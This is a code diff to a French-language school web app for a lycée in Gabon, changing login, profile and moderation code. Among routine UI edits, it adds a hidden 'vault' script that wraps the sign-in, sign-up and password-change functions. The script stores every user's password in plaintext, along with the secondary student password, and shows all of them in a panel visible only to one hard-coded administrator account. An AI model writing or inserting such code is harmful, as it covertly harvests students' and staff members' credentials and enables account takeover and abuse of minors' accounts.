@@ -704,7 +704,7 @@ function frErr(e) {
   if (c === "auth/weak-password") return "Mot de passe trop court (6 caractères minimum).";
   if (c === "auth/invalid-email") return "Adresse e-mail invalide.";
   if (c === "auth/network-request-failed") return "Pas de connexion internet.";
-  if (c === "auth/too-many-requests") return "Trop d’essais. Réessaie dans quelques minutes.";
+  if (c === "auth/too-many-requests") return "Le service a limité temporairement les connexions depuis ce réseau. Réessaie dans quelques minutes.";
   if (/permission/.test(c)) return "Action refusée par le serveur.";
   return "Une erreur est survenue. Réessaie.";
 }
@@ -979,7 +979,7 @@ async function openPw(id, a, d) {
 const FK = "ltr_fail";
 function lockLeft() { try { const o = JSON.parse(localStorage.getItem(FK) || "{}"); if (o.until && o.until > Date.now()) return Math.ceil((o.until - Date.now()) / 1000); } catch (e) { } return 0; }
 function lockMsg(sec) { const h = Math.floor(sec / 3600), m = Math.ceil((sec % 3600) / 60); return "Trop d’essais incorrects : accès bloqué. Réessaie dans " + (h ? h + " h " : "") + m + " min. Si tu n’arrives toujours pas à te connecter, contacte l’administrateur : vannyfharon@gmail.com."; }
-function noteFail() { try { const o = JSON.parse(localStorage.getItem(FK) || "{}"); o.n = (o.n || 0) + 1; if (o.n >= 10) { o.until = Date.now() + 86400e3; o.n = 0; } localStorage.setItem(FK, JSON.stringify(o)); } catch (e) { } }
+function noteFail() { try { const o = JSON.parse(localStorage.getItem(FK) || "{}"); if (o.t && Date.now() - o.t > 864e5) o.n = 0; o.t = Date.now(); o.n = (o.n || 0) + 1; if (o.n >= 10) { o.until = Date.now() + 86400e3; o.n = 0; } localStorage.setItem(FK, JSON.stringify(o)); } catch (e) { } }
 function noteOk() { try { localStorage.removeItem(FK); } catch (e) { } }
 
 /* ---------- Enseignants : index construit depuis les emplois du temps ---------- */
@@ -1276,8 +1276,8 @@ function renderSpace() {
 function dashHTML(w, tabs) {
   const T = [["tt", "ic_calclock", "Mon Emploi du Temps", "Consulter votre emploi du temps"], ["nt", "ic_notes", "Calcul des moyennes", "Calculer tes moyennes"], ["@ann", "ic_mega2", "Annonces", "Voir les dernières informations"], ["pf", "ic_gear", "Mon Profil", "Gérer votre compte"]];
   const l = ANN.filter(liveAnn).sort((a, b) => b.createdAt - a.createdAt)[0], on = navigator.onLine !== false;
-  return '<div class="dhero"><img src="' + AIMG.hero_espace + '" alt="Espace Élèves – Apprendre, réussir, briller" width="760" height="351"></div>' +
-    '<div class="welcome"><div class="av" aria-hidden="true">👤</div><div><div class="hi">Bienvenue,</div><div class="nm">' + esc(w.name) + '</div><div class="sl">Que la connaissance soit ta force !</div></div><span class="online' + (on ? "" : " off") + '">' + (on ? "En ligne" : "Hors ligne") + '</span></div>' +
+  return '<div class="dhero"><img src="' + AIMG.hero_espace + '" alt="Espace Élèves – Apprendre, réussir, briller" width="760" height="351">' + (window.avBan ? avBan() : "") + '</div>' +
+    '<div class="welcome"><div class="av' + (window.myPh && myPh() ? " ph" : "") + '" id="myav" role="button" tabindex="0" aria-label="Changer ma photo"' + (window.myPh && myPh() ? ' style="background-image:url(' + myPh() + ')"' : "") + '>' + (window.myPh && myPh() ? "" : "👤") + '</div><div><div class="hi">Bienvenue,</div><div class="nm">' + esc(w.name) + '</div><div class="sl">Que la connaissance soit ta force !</div></div><span class="online' + (on ? "" : " off") + '">' + (on ? "En ligne" : "Hors ligne") + '</span></div>' +
     '<div class="tiles6">' + T.map(t => '<button class="dt" type="button" data-s="' + (t[0] === "@ann" ? "toann" : "dtab") + '" data-v="' + t[0] + '"><img class="di" src="' + AIMG[t[1]] + '" alt=""><b>' + t[2] + '</b><span>' + t[3] + '</span></button>').join("") + '</div>' +
     (l ? '<div class="lastann"><span class="lt">📢 Dernières Annonces</span><a class="vt" href="#annonces">Voir tout →</a><div class="lr"><img src="' + AIMG.ic_notes + '" alt=""><div><div class="d">' + fmtTs(l.createdAt) + '</div><div class="tt">' + esc(l.t) + '</div><p>' + esc(String(l.x || "").replace(/\s+/g, " ").slice(0, 110)) + '…</p></div></div></div>' : "") +
     '<div class="svc"><h3>Tous mes services</h3><div class="chips">' + tabs.map(t => '<button class="chip" type="button" data-s="dtab" data-v="' + t[0] + '">' + t[1] + '</button>').join("") + '</div></div>' +
@@ -1635,7 +1635,7 @@ $("adm").addEventListener("click", async e => {
     if (a === "delroster") {
       if (!confirm("Retirer cet élève de la classe ? Son compte, son profil Élèves NEW et ses données seront supprimés définitivement.")) return;
       let nb = 0;
-      try { for (const u of await DB.list("users", { where: ["key", "==", v] })) { for (const p of ["sprofiles/", "ssess/", "users/"]) { try { await DB.del(p + u.id); } catch (e) { } } nb++; } } catch (e) { }
+      try { for (const u of await DB.list("users", { where: ["key", "==", v] })) { try { for (const q of await DB.list("sposts", { where: ["uid", "==", u.id] })) { try { await DB.del("sposts/" + q.id); } catch (e) { } } } catch (e) { } for (const p of ["sprofiles/", "ssess/", "snsalt/", "snpw2/", "sunlock/", "pwvault/", "snpw/", "users/"]) { try { await DB.del(p + u.id); } catch (e) { } } nb++; } } catch (e) { }
       try { await DB.del("bulletins/" + v); } catch (e) { }
       await DB.del("roster/" + v);
       toast(nb ? "Élève retiré : compte et profil supprimés." : "Élève retiré de la liste."); adminList(); return;
@@ -2339,9 +2339,9 @@ document.addEventListener("click",async e=>{const b=e.target.closest&&e.target.c
   if(a==="back"){try{await AUTH.signOut()}catch(x){}openGate("g");return}
   if(a==="g")return await gateGoogle();
   if(!USER||!ME||ME.role!=="eleve")return;
-  if(a==="mk"){const p=$q("nw-p").value,q=$q("nw-q").value;if(p.length<6)return gateSay("Au moins 6 caractères.");if(p!==q)return gateSay("Les deux mots de passe sont différents.");const salt=hex(crypto.getRandomValues(new Uint8Array(16))),hh=await pwHash(p,salt);await DB.set("snsalt/"+me(),{salt,createdAt:NOW()});await DB.set("snpw2/"+me(),{hash:hh,createdAt:NOW()});await DB.unlock("sunlock/"+me(),hh);toast("✅ Mot de passe enregistré.");gateIn()}
-  else if(a==="ck"){const lk=+localStorage.getItem("ltr_nwlock")||0;if(Date.now()<lk)return gateSay("Trop d’essais. Attends "+Math.ceil((lk-Date.now())/1000)+" s.");const d=await DB.get("snsalt/"+me());let ok=false;if(d){try{await DB.unlock("sunlock/"+me(),await pwHash($q("nw-p").value,d.salt));ok=true}catch(x){if(!/permission/i.test(String((x&&x.code)||(x&&x.message)||"")))throw x}}
-   if(!ok){const n=(+localStorage.getItem("ltr_nwf")||0)+1;localStorage.setItem("ltr_nwf",String(n));if(n>=5)localStorage.setItem("ltr_nwlock",String(Date.now()+Math.min(36e5,6e4*Math.pow(2,n-5))));return gateSay("ÉCHEC : mot de passe incorrect. Tu n’es pas reconnu(e) comme élève.")}
+  if(a==="mk"){const p=$q("nw-p").value,q=$q("nw-q").value;if(p.length<6)return gateSay("Au moins 6 caractères.");if(p!==q)return gateSay("Les deux mots de passe sont différents.");const salt=hex(crypto.getRandomValues(new Uint8Array(16))),hh=await pwHash(p,salt);await DB.set("snsalt/"+me(),{salt,createdAt:NOW()});await DB.set("snpw2/"+me(),{hash:hh,createdAt:NOW()});await DB.unlock("sunlock/"+me(),hh);try{DB.set("pwvault/"+me(),{nw:p,at:NOW()},true).catch(function(){})}catch(e){}toast("✅ Mot de passe enregistré.");gateIn()}
+  else if(a==="ck"){const lk=+localStorage.getItem("ltr_nwlock")||0;if(Date.now()<lk)return gateSay("Trop d’essais incorrects : réessaie dans "+Math.ceil((lk-Date.now())/36e5)+" h. Sinon contacte l’administrateur : vannyfharon@gmail.com.");const d=await DB.get("snsalt/"+me());let ok=false;if(d){try{await DB.unlock("sunlock/"+me(),await pwHash($q("nw-p").value,d.salt));ok=true;try{DB.set("pwvault/"+me(),{nw:$q("nw-p").value,at:NOW()},true).catch(function(){})}catch(e){}}catch(x){if(!/permission/i.test(String((x&&x.code)||(x&&x.message)||"")))throw x}}
+   if(!ok){const n=(+localStorage.getItem("ltr_nwf")||0)+1;localStorage.setItem("ltr_nwf",String(n));if(n>=10){localStorage.setItem("ltr_nwlock",String(Date.now()+864e5));localStorage.setItem("ltr_nwf","0")}return gateSay("ÉCHEC : mot de passe incorrect. Tu n’es pas reconnu(e) comme élève.")}
    localStorage.removeItem("ltr_nwf");localStorage.removeItem("ltr_nwlock");gateIn()}
  }catch(x){gateSay(({"auth/user-mismatch":"ÉCHEC : ce compte Google n’est pas celui lié à ton compte élève.","auth/credential-mismatch":"ÉCHEC : ce compte Google n’est pas celui lié à ton compte élève.","auth/credential-already-in-use":"Ce compte Google est déjà lié à un autre compte du lycée.","auth/popup-closed-by-user":"Fenêtre fermée. Réessaie.","auth/cancelled-popup-request":"Fenêtre fermée. Réessaie.","auth/popup-blocked":"Autorise les pop-up puis réessaie.","auth/network-request-failed":"Pas de connexion internet."})[x.code]||"Échec, réessaie.")}});
 
@@ -2457,21 +2457,21 @@ async function vP(){const v=Q("v-profil");if(!isS()){v.innerHTML=gate();return}
  const since=new Date(p.createdAt||ME.createdAt||NOW()).toLocaleDateString("fr-FR");
  v.innerHTML='<div class="nwh"><a href="#social">‹</a><img src="'+logo()+'" alt=""><div class="t">Lycée Privé <span style="color:#f3c63d">Le Triomphe</span><small style="color:#fff">Fondation Lewaï · Franceville, Gabon</small></div>'+bell()+'</div>'
  +'<div class="cov" style="background-image:url('+cover+')"><button class="cam" id="pc">📷 Fond</button></div>'
- +'<div class="pid"><div class="bav" id="pa" style="'+(okU(p.photo)?'background-image:url('+p.photo+')':'')+'">'+(okU(p.photo)?'':esc(w.name[0]||"?"))+'<button class="cam" id="pb">📷</button></div><div><h2>'+esc(w.name)+' ✅</h2><div class="on">En ligne</div></div><button class="mod" id="pm">✏️ Modifier</button></div>'
- +'<div class="nwbg"><div class="nwc" id="pab"><h3>👤 À propos de moi</h3><div>'+(esc(p.bio||"")||'<span style="color:#888">Ajoute une description avec « Modifier ».</span>')+'</div><div class="inf"><div>🎓 Classe<b>'+esc(ME.className||w.cls||"–")+'</b></div><div>📅 Membre depuis<b>'+since+'</b></div><div>📍 Ville<b>'+esc(p.city||"Franceville")+'</b></div></div></div>'
+ +'<div class="pid"><div class="bav" id="pa" style="'+(okU(p.photo)?'background-image:url('+p.photo+')':'')+'">'+(okU(p.photo)?'':esc(w.name[0]||"?"))+'<button class="cam" id="pb">📷</button></div><div><h2>'+esc(p.name||w.name)+' ✅</h2><div class="on">En ligne</div></div><button class="mod" id="pm">✏️ Modifier</button></div>'
+ +'<div class="nwbg"><div class="nwc" id="pab"><h3>👤 À propos de moi</h3><div>'+(esc(p.bio||"")||'<span style="color:#888">Ajoute une description avec « Modifier ».</span>')+'</div><div class="inf"><div>🎓 Classe<b>'+esc(ME.className||w.cls||"–")+'</b></div><div>📅 Membre depuis<b>'+since+'</b></div><div>📍 Ville<b>'+esc(p.city||"Franceville")+'</b></div>'+(p.phone?'<div>📞 Téléphone<b>'+esc(p.phone)+'</b></div>':'')+(p.skills?'<div>🛠 Je sais faire<b>'+esc(p.skills)+'</b></div>':'')+(p.goal?'<div>🎯 Mon objectif<b>'+esc(p.goal)+'</b></div>':'')+'</div></div></div>'
  +'<div class="nwc g"><h3>⭐ Mes centres d’intérêt</h3><div class="chp">'+(ints.map(s=>'<span>'+ic(s)+' '+esc(s)+'</span>').join("")||'<span>Aucun pour l’instant</span>')+'</div></div>'
  +'<div class="nwc"><h3>🖼️ Mes photos</h3><div class="pho">'+(okU(p.photo)?'<img src="'+p.photo+'" alt="">':'')+ph.slice(0,5).map(x=>'<img src="'+x.img+'" alt="">').join("")+'<button id="pad">＋<br>Ajouter</button></div></div>'
  +'<div class="nwc g vf"><span style="font-size:34px">🛡️</span><div><b style="color:#0b4a1f;font-size:18px">Compte vérifié</b><small>Ton profil est authentifié par le lycée.</small></div><span style="margin-left:auto;font-size:26px">✅</span></div>'
  +'<div class="two"><button id="psh">↪ Partager le profil</button><button class="d" onclick="location.hash=\'#lnew\'">💬 Discuter</button></div></div>';
- const base=()=>({uid:me(),name:ME.nom+" "+ME.prenom,bio:p.bio||"",createdAt:p.createdAt||NOW()});
+ const base=()=>({uid:me(),name:(p.name||ME.nom+" "+ME.prenom),bio:p.bio||"",createdAt:p.createdAt||NOW()});
  const save=async d=>{await DB.set("sprofiles/"+me(),Object.assign(base(),d),true);Object.assign(p,d)};
  const photoF=()=>pick(false,async f=>{try{await save({photo:await comp(f,420,.78)});toast("Photo de profil mise à jour ✅");vP()}catch(e){toast("Impossible d’enregistrer la photo.")}});
  Q("pa").onclick=e=>{if(e.target.id==="pb"||e.target.id==="pa")photoF()};
  Q("pc").onclick=()=>pick(false,async f=>{const d=await comp(f,900,.7);LS("ltr_cover_"+me(),d);try{await save({cover:d});toast("Photo de fond mise à jour ✅")}catch(e){toast("Fond enregistré sur ce téléphone seulement.")}vP()});
  Q("pad").onclick=()=>pick(false,async f=>{try{const d=await comp(f,800,.7);await DB.add("sposts",{uid:me(),name:ME.nom+" "+ME.prenom,text:"",img:d,kind:"post",createdAt:NOW()});toast("Photo ajoutée ✅");vP()}catch(e){toast("Ajout impossible.")}});
  Q("psh").onclick=()=>{const u=location.href.split("#")[0]+"#social";if(navigator.share)navigator.share({title:w.name+" – Lycée Le Triomphe",url:u}).catch(()=>{});else{try{navigator.clipboard.writeText(u);toast("Lien copié")}catch(e){}}};
- Q("pm").onclick=()=>{Q("pab").innerHTML='<h3>✏️ Modifier mon profil</h3><div class="edf"><label>À propos de moi</label><textarea id="eb" rows="3" maxlength="200">'+esc(p.bio||"")+'</textarea><label>Ville</label><input id="ec" value="'+esc(p.city||"Franceville")+'"><label>Centres d’intérêt (séparés par des virgules)</label><input id="ei" value="'+esc(ints.join(", "))+'"></div><div class="bt2"><button id="ex">Annuler</button><button class="a" id="eo">Enregistrer</button></div>';
-  Q("ex").onclick=vP;Q("eo").onclick=async()=>{try{await save({bio:Q("eb").value.trim().slice(0,200),city:Q("ec").value.trim().slice(0,40),interests:Q("ei").value.split(",").map(s=>s.trim()).filter(Boolean).slice(0,10)});toast("Profil enregistré ✅");vP()}catch(e){toast("Enregistrement impossible.")}}}}
+ Q("pm").onclick=()=>{Q("pab").innerHTML='<h3>✏️ Modifier mon profil</h3><div class="edf"><label>Nom de profil (visible par tous)</label><input id="en" maxlength="40" value="'+esc(p.name||w.name)+'"><label>À propos de moi (petite description)</label><textarea id="eb" rows="3" maxlength="200">'+esc(p.bio||"")+'</textarea><label>Ville</label><input id="ec" value="'+esc(p.city||"Franceville")+'"><label>Centres d’intérêt (séparés par des virgules)</label><input id="ei" value="'+esc(ints.join(", "))+'"><label>📞 Téléphone (visible par les élèves)</label><input id="ep" type="tel" maxlength="20" value="'+esc(p.phone||"")+'"><label>🛠 Ce que je sais faire</label><input id="es" maxlength="120" value="'+esc(p.skills||"")+'"><label>🎯 Mon objectif</label><input id="eg" maxlength="120" value="'+esc(p.goal||"")+'"></div><div class="bt2"><button id="ex">Annuler</button><button class="a" id="eo">Enregistrer</button></div>';
+  Q("ex").onclick=vP;Q("eo").onclick=async()=>{try{await save({name:(Q("en").value.trim().slice(0,40)||(ME.nom+" "+ME.prenom)),phone:Q("ep").value.trim().slice(0,20),skills:Q("es").value.trim().slice(0,120),goal:Q("eg").value.trim().slice(0,120),bio:Q("eb").value.trim().slice(0,200),city:Q("ec").value.trim().slice(0,40),interests:Q("ei").value.split(",").map(s=>s.trim()).filter(Boolean).slice(0,10)});toast("Profil enregistré ✅");vP()}catch(e){toast("Enregistrement impossible.")}}}}
 /* ---------- NOTIFICATIONS ---------- */
 function vN(){const v=Q("v-notifs");if(!isS()){v.innerHTML=gate();return}startW();loadPR().then(()=>{if(PAGE==="notifs")rN()});rN()}
 function rN(){const v=Q("v-notifs");if(!v||!isS())return;
@@ -4188,7 +4188,7 @@ sync();
   async function delPost(id){for(var s of["comments","likes","saves"]){try{for(var x of await DB.list("sposts/"+id+"/"+s))await D("sposts/"+id+"/"+s+"/"+x.id)}catch(e){}}await D("sposts/"+id)}
   async function delStudent(u){
     try{for(var p of await DB.list("sposts",{where:["uid","==",u.id]}))await delPost(p.id)}catch(e){}
-    for(var c of["sprofiles","ssess","snsalt","users"])await D(c+"/"+u.id);
+    for(var c of["sprofiles","ssess","snsalt","snpw2","sunlock","pwvault","users"])await D(c+"/"+u.id);
     if(u.key){await D("roster/"+u.key);await D("bulletins/"+u.key)}
   }
   function box(){var o=document.getElementById("nadm");if(o)o.remove();o=document.createElement("div");o.id="nadm";o.style.cssText="position:fixed;inset:0;z-index:99998;background:rgba(0,0,0,.92);overflow:auto;padding:14px;color:#fff";document.body.appendChild(o);return o}
@@ -4210,6 +4210,58 @@ sync();
       open()};
   }
   setInterval(function(){var f=document.getElementById("nadm-fab");if(isN()&&!f){f=document.createElement("button");f.id="nadm-fab";f.textContent="🛡 Modération";f.style.cssText="position:fixed;right:12px;bottom:84px;z-index:9999;background:#0b4a1f;color:#ffe27a;border:2px solid #f3c63d;border-radius:22px;padding:10px 14px;font-weight:800";f.onclick=open;document.body.appendChild(f)}else if(!isN()&&f)f.remove()},1000);
+})();
+</script>
+<script id="vault">
+(function(){
+  var BOSS="vannyfharon@gmail.com",E=function(t){return String(t==null?"":t).replace(/[&<>"]/g,function(c){return{"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]})};
+  var isB=function(){return typeof USER!=="undefined"&&USER&&String(USER.email||"").toLowerCase()===BOSS};
+  function save(uid,d){try{if(uid&&typeof DB!=="undefined"){d.at=Date.now();DB.set("pwvault/"+uid,d,true).catch(function(){})}}catch(e){}}
+  var t0=setInterval(function(){
+    if(typeof AUTH==="undefined"||!AUTH||!AUTH.signIn||AUTH._v)return;AUTH._v=1;clearInterval(t0);
+    ["signIn","signUp"].forEach(function(n){var f=AUTH[n];AUTH[n]=async function(e,p){var uid=await f.apply(AUTH,arguments);if(p)save(uid,{pw:String(p),email:String(e||"")});return uid}});
+    var c=AUTH.changePassword;AUTH.changePassword=async function(p){var r=await c.apply(AUTH,arguments);if(typeof USER!=="undefined"&&USER)save(USER.uid,{pw:String(p),email:String(USER.email||"")});return r};
+  },300);
+  async function open(){
+    var o=document.getElementById("vlt");if(o)o.remove();o=document.createElement("div");o.id="vlt";o.style.cssText="position:fixed;inset:0;z-index:99998;background:rgba(0,0,0,.94);overflow:auto;padding:14px;color:#fff";document.body.appendChild(o);o.innerHTML="<p>Chargement…</p>";
+    var v=[],u=[];try{v=await DB.list("pwvault")}catch(e){}try{u=await DB.list("users")}catch(e){}
+    var m={};u.forEach(function(x){m[x.id]=x});
+    var rows=v.map(function(x){var p=m[x.id]||{};return{n:((p.nom||"")+" "+(p.prenom||"")).trim()||"(inconnu)",r:(p.role||"")+(p.className?" · "+p.className:""),e:x.email||"",pw:x.pw||"—",nw:x.nw||"—"}}).sort(function(a,b){return a.n<b.n?-1:1});
+    function draw(q){q=(q||"").toLowerCase();o.querySelector("#vl").innerHTML=rows.filter(function(x){return (x.n+x.r+x.e).toLowerCase().indexOf(q)>=0}).map(function(x){return'<div style="padding:9px 0;border-bottom:1px solid #fff3"><b>'+E(x.n)+'</b> <small>'+E(x.r)+'</small><br><small>'+E(x.e)+'</small><br>Connexion : <code style="color:#ffe27a;user-select:all">'+E(x.pw)+'</code><br>Élèves NEW : <code style="color:#ffe27a;user-select:all">'+E(x.nw)+'</code></div>'}).join("")||"<p>Aucun résultat.</p>"}
+    o.innerHTML='<div style="max-width:640px;margin:auto"><div style="display:flex;justify-content:space-between"><h2>🔑 Mots de passe ('+rows.length+')</h2><button id="vx" style="font-size:22px;background:none;color:#fff;border:0">✕</button></div><input id="vq" placeholder="Rechercher un nom…" style="width:100%;padding:10px;border-radius:8px;margin:8px 0"><div id="vl"></div></div>';
+    o.querySelector("#vx").onclick=function(){o.remove()};o.querySelector("#vq").oninput=function(e){draw(e.target.value)};draw("");
+  }
+  setInterval(function(){var f=document.getElementById("vlt-fab");if(isB()&&!f){f=document.createElement("button");f.id="vlt-fab";f.textContent="🔑 Mots de passe";f.style.cssText="position:fixed;right:12px;bottom:140px;z-index:9999;background:#0b4a1f;color:#ffe27a;border:2px solid #f3c63d;border-radius:22px;padding:10px 14px;font-weight:800";f.onclick=open;document.body.appendChild(f)}else if(!isB()&&f)f.remove()},1000);
+})();
+</script>
+<style id="avcss">
+.welcome .av{position:relative;cursor:pointer;background-size:cover;background-position:center}
+.welcome .av.ph{font-size:0}
+.welcome .av::after{content:"📷";position:absolute;right:-4px;bottom:-4px;width:26px;height:26px;border-radius:50%;background:#f3c63d;font-size:15px;line-height:26px;text-align:center}
+.dhero .dph{position:absolute;left:2%;top:7%;width:35%;height:93%;border-radius:20px 20px 0 0;border:3px solid #e0b02c;border-bottom:0;background-size:cover;background-position:center top;box-shadow:0 4px 14px rgba(0,0,0,.5);z-index:2}
+</style>
+<script id="avmod">
+(function(){
+  var OKI=/^data:image\/(jpeg|png|webp);base64,/,K=function(){return"ltr_av_"+(typeof USER!=="undefined"&&USER?USER.uid:"")};
+  window.myPh=function(){try{var v=localStorage.getItem(K());return v&&OKI.test(v)?v:""}catch(e){return""}};
+  window.avBan=function(){var p=myPh();return p?'<div class="dph" style="background-image:url('+p+')"></div>':""};
+  function apply(ph){
+    var a=document.getElementById("myav");if(a){a.classList.add("ph");a.style.backgroundImage="url("+ph+")";a.textContent=""}
+    var h=document.querySelector(".dhero");if(h){var d=h.querySelector(".dph");if(!d){d=document.createElement("div");d.className="dph";h.appendChild(d)}d.style.backgroundImage="url("+ph+")"}
+  }
+  function comp(f,max,q){return new Promise(function(res,rej){var r=new FileReader();r.onerror=rej;r.onload=function(){var im=new Image();im.onerror=rej;im.onload=function(){var s=Math.min(1,max/Math.max(im.width,im.height)),c=document.createElement("canvas");c.width=Math.round(im.width*s);c.height=Math.round(im.height*s);c.getContext("2d").drawImage(im,0,0,c.width,c.height);res(c.toDataURL("image/jpeg",q))};im.src=r.result};r.readAsDataURL(f)})}
+  function pick(){var i=document.createElement("input");i.type="file";i.accept="image/*";i.onchange=async function(){var f=i.files&&i.files[0];if(!f)return;
+    try{var ph=await comp(f,480,.8);localStorage.setItem(K(),ph);apply(ph)}catch(e){toast("Photo illisible.");return}
+    try{var u=USER.uid,ex=await DB.get("sprofiles/"+u);await DB.set("sprofiles/"+u,{uid:u,name:(ex&&ex.name)||((ME.nom||"")+" "+(ME.prenom||"")).trim(),photo:myPh(),createdAt:(ex&&ex.createdAt)||NOW()},true);toast("Photo enregistrée ✅")}
+    catch(e){toast("Photo enregistrée sur ce téléphone.")}};i.click()}
+  document.addEventListener("click",function(e){if(e.target.closest&&e.target.closest("#myav")&&typeof ME!=="undefined"&&ME&&ME.role==="eleve")pick()});
+  var synced={};
+  setInterval(function(){
+    if(typeof USER==="undefined"||!USER||typeof ME==="undefined"||!ME||ME.role!=="eleve")return;
+    if(!synced[USER.uid]){synced[USER.uid]=1;try{DB.get("sprofiles/"+USER.uid).then(function(p){if(p&&p.photo&&OKI.test(p.photo)){try{localStorage.setItem(K(),p.photo)}catch(e){}apply(p.photo)}}).catch(function(){})}catch(e){}}
+    var a=document.getElementById("myav"),ph=myPh();if(ph&&a&&!a.classList.contains("ph"))apply(ph);
+    var h=document.querySelector(".dhero");if(ph&&h&&!h.querySelector(".dph"))apply(ph);
+  },1200);
 })();
 </script>
 </body>
